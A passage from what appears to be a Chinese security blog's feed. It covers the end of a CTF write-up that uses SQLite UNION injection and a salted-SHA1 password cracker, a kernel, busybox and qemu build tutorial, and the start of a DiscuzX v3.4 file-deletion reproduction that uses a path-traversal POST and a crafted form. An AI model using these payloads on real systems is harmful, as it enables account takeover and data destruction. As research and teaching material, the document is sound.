<p>结合上面的这条语句，以及下面几条注入语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">usr=%27 UNION SELECT id, id from Users limit 0,1--+&amp;pw=chybeta  </div><div class="line">usr=%27 UNION SELECT id, name from Users limit 0,1--+&amp;pw=chybeta</div><div class="line">usr=%27 UNION SELECT id, password from Users limit 0,1--+&amp;pw=chybeta</div><div class="line">usr=%27 UNION SELECT id, hint from Users limit 0,1--+&amp;pw=chybeta</div></pre></td></tr></table></figure></p>
<p>通过偏移，可以得到表中数据。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">name</th>
<th style="text-align:center">password</th>
<th style="text-align:center">hint</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">admin</td>
<td style="text-align:center">3fab54a50e770d830c0416df817567662a9dc85c</td>
<td style="text-align:center">my fav word in my fav paper?!</td>
</tr>
<tr>
<td style="text-align:center">fritze</td>
<td style="text-align:center">54eae8935c90f467427f05e4ece82cf569f89507</td>
<td style="text-align:center">my love is…?</td>
</tr>
<tr>
<td style="text-align:center">hansi</td>
<td style="text-align:center">34b0bb7c304949f9ff2fc101eef0f048be10d3bd</td>
<td style="text-align:center">the password is password</td>
</tr>
</tbody>
</table>
</div>
<p>直接去查没查出来。结合源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$res = $db-&gt;query(&quot;SELECT id,name from Users where name=&apos;&quot;.$user.&quot;&apos; and password=&apos;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&apos;&quot;);</div></pre></td></tr></table></figure></p>
<p>而hint：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">my fav word in my fav paper?!</div></pre></td></tr></table></figure></p>
<p>所以将网站上所有的pdf文件下载下来（30个吧）。利用paper中的词尝试进行爆破。最后脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> cStringIO <span class="keyword">import</span> StringIO</div><div class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager, PDFPageInterpreter</div><div class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> TextConverter</div><div class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LAParams</div><div class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFPage</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pdf</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">"./"</span>) <span class="keyword">if</span> i.endswith(<span class="string">"pdf"</span>)]</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_pdf_2_text</span><span class="params">(path)</span>:</span></div><div class="line">    rsrcmgr = PDFResourceManager()</div><div class="line">    retstr = StringIO()</div><div class="line">    device = TextConverter(rsrcmgr, retstr, codec=<span class="string">'utf-8'</span>, laparams=LAParams())</div><div class="line">    interpreter = PDFPageInterpreter(rsrcmgr, device)</div><div class="line">    <span class="keyword">with</span> open(path, <span class="string">'rb'</span>) <span class="keyword">as</span> fp:</div><div class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> PDFPage.get_pages(fp, set()):</div><div class="line">            interpreter.process_page(page)</div><div class="line">        text = retstr.getvalue()</div><div class="line">    device.close()</div><div class="line">    retstr.close()</div><div class="line">    <span class="keyword">return</span> text</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_password</span><span class="params">()</span>:</span></div><div class="line">	pdf_path = get_pdf()</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> pdf_path:</div><div class="line">		<span class="keyword">print</span> <span class="string">"Searching word in "</span> + i</div><div class="line">		pdf_text = convert_pdf_2_text(i).split(<span class="string">" "</span>)</div><div class="line">		<span class="keyword">for</span> word <span class="keyword">in</span> pdf_text:</div><div class="line">			sha1_password = hashlib.sha1(word+<span class="string">"Salz!"</span>).hexdigest()</div><div class="line">			<span class="keyword">if</span> sha1_password == <span class="string">'3fab54a50e770d830c0416df817567662a9dc85c'</span>:</div><div class="line">				<span class="keyword">print</span> <span class="string">"Find the password :"</span> + word</div><div class="line">				exit()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">	find_password()</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171022/5.png?raw=true" alt=""></p>
<p>得到密码为：ThinJerboa</p>
<p>访问 <a href="https://flatscience.flatearth.fluxfingers.net/admin.php" target="_blank" rel="external">https://flatscience.flatearth.fluxfingers.net/admin.php</a> 登陆得到flag：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171022/6.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;Th3_Fl4t_Earth_Prof_i$_n0T_so_Smart_huh?&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SQLite injection&lt;br&gt;burte force&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux kernel development (1): 环境准备</title>
    <link href="http://chybeta.github.io/2017/10/19/Linux-kernel-development-1-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"/>
    <id>http://chybeta.github.io/2017/10/19/Linux-kernel-development-1-环境准备/</id>
    <published>2017-10-19T15:28:00.000Z</published>
    <updated>2017-10-21T00:57:38.353Z</updated>
    
    <content type="html"><![CDATA[<p>linux kernel + busybox + qemu<br>Linux kernel development (1): 环境准备<br><a id="more"></a></p>
<h1 id="寻坑之旅"><a href="#寻坑之旅" class="headerlink" title="寻坑之旅"></a>寻坑之旅</h1><h2 id="linux-kernel"><a href="#linux-kernel" class="headerlink" title="linux kernel"></a>linux kernel</h2><h3 id="打包上路"><a href="#打包上路" class="headerlink" title="打包上路"></a>打包上路</h3><p>获取linux kernel源代码。因为书中根据的源代码是2.6，所以就只选择了这个版本。<br>可以从 这里获取 <a href="https://www.kernel.org/pub/linux/kernel/v2.6/" target="_blank" rel="external">https://www.kernel.org/pub/linux/kernel/v2.6/</a>  比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~$ wget https://www.kernel.org/pub/linux/kernel/v2.6/linux-2.6.39.tar.bz2</div></pre></td></tr></table></figure></p>
<p>解压，会详细的列出解压的文件，解压后的文件会保存在linux-2.6.39文件夹中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~$ tar xvjf linux-2.6.32.tar.bz2</div></pre></td></tr></table></figure></p>
<p>或者使用git，（这个会下载很大的文件）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~$ git clone https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux-2.6.git</div></pre></td></tr></table></figure></p>
<p>然后根据需要的版本checkout出来。</p>
<p>进入解压出来的文件夹。接下去配置（config）内核。根据网上的方法，对于ubuntu系统，可以直接把/boot/ 里的<code>.config</code>文件拷贝到linux-2.6.32中。这里用用make menuconfig 来进行图形化配置内核并生成 .confgi文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~/linux-2.6.39$ make menuconfig</div></pre></td></tr></table></figure></p>
<p>不想进行个性化配置的话，可以使用默认生成的.config，我这里直接使用默认配置了:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~/linux-2.6.39$ make defconfig</div></pre></td></tr></table></figure></p>
<p>其他一些类似命令，这里仅列出：</p>
<ol>
<li>make oldconfig 使用已经存在的 ./.config的内容，将里面的原本值作为新config的设定值。新config中涉及的新特性则列出来让用户选择。</li>
<li>make gconfig 用Gtx图形界面来配置。需要X window支持。</li>
<li>make xconfig 用Qt图形界面来配置。需要X window支持。</li>
<li>make config</li>
</ol>
<p>配置完（我直接保持默认配置没进行改动）后，选择 <code>Save an Alternate Configuration File</code>，将配置保存到 .config 文件中。</p>
<p>接下里开始make<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~/linux-2.6.39$ make all</div><div class="line">chybeta@ubuntu:~/linux-2.6.39$ make module</div></pre></td></tr></table></figure></p>
<p>在make all中可能会遇到各种坑，遇到的话看这把。ps，好像make module可以不用。</p>
<p>最后编译完成：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171020/5.png?raw=true" alt=""></p>
<p>生成的镜像存放在 arch/x86/boot/bzImage。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~/linux-2.6.39$ file arch/x86/boot/bzImage</div><div class="line">arch/x86/boot/bzImage: Linux kernel x86 boot executable bzImage, version 2.6.39 (chybeta@ubuntu) #1 SMP Sat Oct 21 00:50:51 CST 2017, RO-rootFS, root_dev 0x801, swap_dev 0x3, Normal VGA</div></pre></td></tr></table></figure></p>
<h3 id="正式填坑"><a href="#正式填坑" class="headerlink" title="正式填坑"></a>正式填坑</h3><p>这次是第一次，但绝不会是最后一次编译内核。所以这部份会长期保持更新。希望对各位有用。</p>
<p>有可能在make all的时候出现下面这些错误：</p>
<h4 id="坑一"><a href="#坑一" class="headerlink" title="坑一"></a>坑一</h4><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171020/2.png?raw=true" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fatal error: linux/compiler-gcc5.h: No such file or directory</div></pre></td></tr></table></figure></p>
<p>原因是 不支持gcc-5编译。可以到<a href="https://github.com/torvalds/linux/blob/v4.0/include/linux/compiler-gcc5.h" target="_blank" rel="external">这里</a>去下一份对应的compiler-gcc5.h。放到 include/linux/compiler-gcc5.h</p>
<h4 id="坑二"><a href="#坑二" class="headerlink" title="坑二"></a>坑二</h4><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171020/3.png?raw=true" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Can&apos;t use &apos;defined(@array)&apos; (Maybe you should just omit the defined()?) at kernel/timeconst.pl line 373.</div><div class="line">/home/chybeta/linux-2.6.39/kernel/Makefile:141: recipe for target &apos;kernel/timeconst.h&apos; failed</div></pre></td></tr></table></figure></p>
<p>编辑 kernel/timeconst.pl ，第372行左右：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">@val = @&#123;$canned_values&#123;$hz&#125;&#125;;</div><div class="line">if (!defined(@val)) &#123;</div><div class="line">	@val = compute_values($hz);</div><div class="line">&#125;</div><div class="line">output($hz, @val);</div></pre></td></tr></table></figure></p>
<p>修改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">@val = @&#123;$canned_values&#123;$hz&#125;&#125;;</div><div class="line">if (!@val) &#123;</div><div class="line">	@val = compute_values($hz);</div><div class="line">&#125;</div><div class="line">output($hz, @val);</div></pre></td></tr></table></figure></p>
<h4 id="坑三"><a href="#坑三" class="headerlink" title="坑三"></a>坑三</h4><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171020/4.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">drivers/gpu/drm/i915/i915_drv.o:i915_drv.c:(.text+0x406): first defined here</div><div class="line">scripts/Makefile.build:405: recipe for target &apos;drivers/gpu/drm/i915/i915.o&apos; failed</div><div class="line">make[4]: *** [drivers/gpu/drm/i915/i915.o] Error 1</div><div class="line">scripts/Makefile.build:419: recipe for target &apos;drivers/gpu/drm/i915&apos; failed</div><div class="line">make[3]: *** [drivers/gpu/drm/i915] Error 2</div><div class="line">scripts/Makefile.build:419: recipe for target &apos;drivers/gpu/drm&apos; failed</div><div class="line">make[2]: *** [drivers/gpu/drm] Error 2</div><div class="line">scripts/Makefile.build:419: recipe for target &apos;drivers/gpu&apos; failed</div><div class="line">make[1]: *** [drivers/gpu] Error 2</div><div class="line">Makefile:919: recipe for target &apos;drivers&apos; failed</div></pre></td></tr></table></figure>
<p>google/stackoverflow上没找到解决方案。</p>
<p>我直接修改了由<code>make defconfig</code>生成的<code>.config</code>文件，其中第1781左右，是关于图形化（Graphics support）的部分，修改参数为如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">#</div><div class="line"># Graphics support</div><div class="line">#</div><div class="line"># CONFIG_AGP is not set</div><div class="line">CONFIG_VGA_ARB=y</div><div class="line">CONFIG_VGA_ARB_MAX_GPUS=1</div><div class="line"># CONFIG_VGA_SWITCHEROO is not set</div><div class="line"># CONFIG_DRM is not set</div><div class="line"># CONFIG_STUB_POULSBO is not set</div><div class="line"># CONFIG_VGASTATE is not set</div><div class="line"># CONFIG_VIDEO_OUTPUT_CONTROL is not set</div><div class="line"># CONFIG_FB is not set</div><div class="line">CONFIG_BACKLIGHT_LCD_SUPPORT=y</div><div class="line"># CONFIG_LCD_CLASS_DEVICE is not set</div><div class="line">CONFIG_BACKLIGHT_CLASS_DEVICE=y</div><div class="line">CONFIG_BACKLIGHT_GENERIC=y</div><div class="line"># CONFIG_BACKLIGHT_PROGEAR is not set</div><div class="line"># CONFIG_BACKLIGHT_APPLE is not set</div><div class="line"># CONFIG_BACKLIGHT_SAHARA is not set</div><div class="line"># CONFIG_BACKLIGHT_ADP8860 is not set</div></pre></td></tr></table></figure></p>
<h2 id="busybox"><a href="#busybox" class="headerlink" title="busybox"></a>busybox</h2><p>busybox里面集成了多种常用linux命令。接下去需要用busybox来生成linux的根文件系统。</p>
<p>在 <a href="https://busybox.net/" target="_blank" rel="external">https://busybox.net/</a> 处下载源码，我下的版本是 BusyBox 1.27.2。</p>
<p>解压缩：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~$ tar -xvjf busybox-1.27.2.tar.bz2</div></pre></td></tr></table></figure></p>
<p>进入busybox文件夹，需要使用静态链接的方式来编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~/busybox-1.27.2$ make menuconfig</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171020/7.png?raw=true" alt=""><br>先进入 Busybox Setting，之后选择Build Options中的 Build Busybox as a static library。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~/busybox-1.27.2$ make install</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171020/6.png?raw=true" alt=""></p>
<p>安装成功。</p>
<p>install后，默认会在busybox的目录下生成一个 <code>_install</code>目录。接下来用这个目录来生成虚拟机挂载时需要的根文件目录。</p>
<p>这一步，创建一个目录用于保存rootfs.img<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~/busybox-1.27.2$ mkdir ../kernelrootfs</div></pre></td></tr></table></figure></p>
<p>生成:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~/busybox-1.27.2$ cd _install/</div><div class="line">chybeta@ubuntu:~/busybox-1.27.2/_install$ find . | cpio -o --format=newc &gt; ../../kernelrootfs/rootfs.img</div><div class="line">5213 blocks</div></pre></td></tr></table></figure></p>
<p>结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~/kernelrootfs$ file rootfs.img</div><div class="line">rootfs.img: ASCII cpio archive (SVR4 with no CRC)</div></pre></td></tr></table></figure></p>
<h2 id="Qemu"><a href="#Qemu" class="headerlink" title="Qemu"></a>Qemu</h2><p>qemu是一个开源的虚拟机，它内部实现了一个gdb server，能方便和gdb对内核进行联合调试。安装qemu虚拟机：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~$ sudo apt-get install qemu qemu-system</div></pre></td></tr></table></figure></p>
<p>用qemu开启虚拟机：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~$ qemu-system-x86_64 -kernel linux-2.6.39/arch/x86/boot/bzImage -initrd kernelrootfs/rootfs.img -append &quot;root=/dev/ram rdinit=/bin/sh&quot;</div></pre></td></tr></table></figure></p>
<p>参数<code>-kernel</code>，用于指定内核的所在地，在前面部分已经保存在为 linux-2.6.39/arch/x86/boot/bzImage 。参数<code>-initrd</code>用于指定linux系统挂载用的根文件目录，由前面章节，已经保存在为 kernelrootfs/rootfs.img 。这两个参数，根据你前面的配置而定。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171020/8.png?raw=true" alt=""></p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>还有一些其他的操作还没写出来，比如添加系统调用（syscall）之类的。以后用到再慢慢补充吧。</p>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li><a href="https://nostillsearching.wordpress.com/2012/09/22/compiling-linux-kernel-and-running-it-using-qemu/" target="_blank" rel="external">Compiling Linux kernel and running it using QEMU</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3700.html" target="_blank" rel="external">Linux 内核漏洞利用教程（一）：环境配置</a></li>
<li><a href="https://stackoverflow.com/questions/17242403/linux-running-self-compiled-kernel-in-qemu-vfs-unable-to-mount-root-fs-on-unk" target="_blank" rel="external">linux: running self compiled kernel in qemu: VFS: Unable to mount root fs on unknown wn-block(0,0)</a></li>
<li><a href="http://blog.csdn.net/LEON1741/article/details/54848842" target="_blank" rel="external">如何使用busybox编译和生成最简linux根文件系统（rootfs） </a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;linux kernel + busybox + qemu&lt;br&gt;Linux kernel development (1): 环境准备&lt;br&gt;
    
    </summary>
    
      <category term="技术杂谈" scheme="http://chybeta.github.io/categories/%E6%8A%80%E6%9C%AF%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="linux" scheme="http://chybeta.github.io/tags/linux/"/>
    
      <category term="kernel" scheme="http://chybeta.github.io/tags/kernel/"/>
    
      <category term="lkd" scheme="http://chybeta.github.io/tags/lkd/"/>
    
      <category term="qemu" scheme="http://chybeta.github.io/tags/qemu/"/>
    
      <category term="busybox" scheme="http://chybeta.github.io/tags/busybox/"/>
    
  </entry>
  
  <entry>
    <title>DiscuzX v3.4 任意文件删除漏洞</title>
    <link href="http://chybeta.github.io/2017/10/15/DiscuzX-v3-4-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/"/>
    <id>http://chybeta.github.io/2017/10/15/DiscuzX-v3-4-任意文件删除漏洞/</id>
    <published>2017-10-15T10:06:18.000Z</published>
    <updated>2017-11-28T05:04:51.675Z</updated>
    
    <content type="html"><![CDATA[<p>代码审计学习。<br>玩一玩老洞应该没关系吧。。<br><a id="more"></a></p>
<h1 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h1><p>DiscuzX版本 ≤ v3.4</p>
<p>官方于9月29日修复该漏洞： <a href="https://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574" target="_blank" rel="external">https://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574</a></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>Dz下载地址： <a href="https://gitee.com/ComsenzDiscuz/DiscuzX.git" target="_blank" rel="external">https://gitee.com/ComsenzDiscuz/DiscuzX.git</a> 选择一个时间线在9月29日前的进行git checkout即可。比如 <code>git checkout 1a912ddb4a62364d1736fa4578b42ecc62c5d0be</code>。安装完成后，在当前目录下准备一个待删除的文件，比如theTestFile.txt<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171016/4.png?raw=true" alt=""></p>
<p>随便注册一个号，进入个人设置中心，即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://10.10.10.1:2500/DiscuzX/upload/home.php?mod=spacecp&amp;ac=profile&amp;op=base</div></pre></td></tr></table></figure></p>
<h2 id="cmsPoc"><a href="#cmsPoc" class="headerlink" title="cmsPoc"></a><a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="external">cmsPoc</a></h2><p>登陆后获取cookie后，命令行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python cmspoc.py -u http://10.10.10.1:2500/DiscuzX/upload/home.php -t discuzx -s v34_delete_arbitrary_files</div></pre></td></tr></table></figure></p>
<p>粘贴cookie，后输入需要删除的文件。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171016/tty.gif?raw=true" alt=""></p>
<h2 id="手动"><a href="#手动" class="headerlink" title="手动"></a>手动</h2><p>修改出生地址为要删除的文件地址，这里比如 ../../theTestFile.txt</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171016/1.png?raw=true" alt=""></p>
<p>可以用burp截包修改<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171016/2.png?raw=true" alt=""></p>
<p>也可以先查看源代码（ctrl+U）后找到formhash值，这里测试环境中为2c7400c6<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171016/7.png?raw=true" alt=""></p>
<p>然后直接进行POST:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:2500/DiscuzX/upload/home.php?mod=spacecp&amp;ac=profile</div><div class="line"></div><div class="line">POST:</div><div class="line">birthprovince=../../../theTestFile.txt&amp;profilesubmit=1&amp;formhash=2c7400c6</div></pre></td></tr></table></figure></p>
<p>回到个人资料处，可以发现出生地已经改变。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171016/8.png?raw=true" alt=""></p>
<h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>接下去是进行正式的任意文件删除。可以自己构造一个表单，如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1:2500/DiscuzX/upload/home.php?mod=spacecp&amp;ac=profile&amp;op=base"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"birthprovince"</span> <span class="attr">value</span>=<span class="string">"../../../theTestFile.txt"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"formhash"</span> <span class="attr">value</span>=<span class="string">"2c7400c6"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"profilesubmit"</span> <span class="attr">value</span>=<span class="string">"1"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">from</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>这里要注意两个点：</p>
<ol>
<li>需要post一个birthprovince参数，其值为要删除的文件，即../../../theTestFile.txt</li>
<li>需要指定formhash参数，这里的值为2c7400c6</li>
</ol>
<p>选择随便一张图片上传，点击submit，可以发现原本的theTestFile.txt已经被删除。</p>
<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>另一种删除方法，直接在个人资料页面修改html代码。比如修改真实姓名处<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171016/10.png?raw=true" alt=""></p>
<p>修改name，value，type分别为birthprovince，要删除的文件路径，file。</p>
<p>之后选择随便一张图片上传，点击下方的保存，同样theTestFile也被删除。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在source/include/spacecp/spacecp_profile.php中，第69行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(submitcheck(<span class="string">'profilesubmit'</span>)) &#123;</div></pre></td></tr></table></figure></p>
<p>先对profilesubmit进行了一次检查。</p>
<p>之后第188行，有一段处理上传文件的代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>($_FILES) &#123;</div><div class="line">	$upload = <span class="keyword">new</span> discuz_upload();</div><div class="line">	<span class="keyword">foreach</span>($_FILES <span class="keyword">as</span> $key =&gt; $file)</div></pre></td></tr></table></figure></p>
<p>往下看，约莫第208行左右，有下述代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(!$upload-&gt;error()) &#123;</div><div class="line">	$upload-&gt;save();</div><div class="line"></div><div class="line">	<span class="keyword">if</span>(!$upload-&gt;get_image_info($attach[<span class="string">'target'</span>])) &#123;</div><div class="line">		@unlink($attach[<span class="string">'target'</span>]);</div><div class="line">		<span class="keyword">continue</span>;</div><div class="line">	&#125;</div><div class="line">	$setarr[$key] = <span class="string">''</span>;</div><div class="line">	$attach[<span class="string">'attachment'</span>] = dhtmlspecialchars(trim($attach[<span class="string">'attachment'</span>]));</div><div class="line">	<span class="keyword">if</span>($vid &amp;&amp; $verifyconfig[<span class="string">'available'</span>] &amp;&amp; <span class="keyword">isset</span>($verifyconfig[<span class="string">'field'</span>][$key])) &#123;</div><div class="line">		<span class="keyword">if</span>(<span 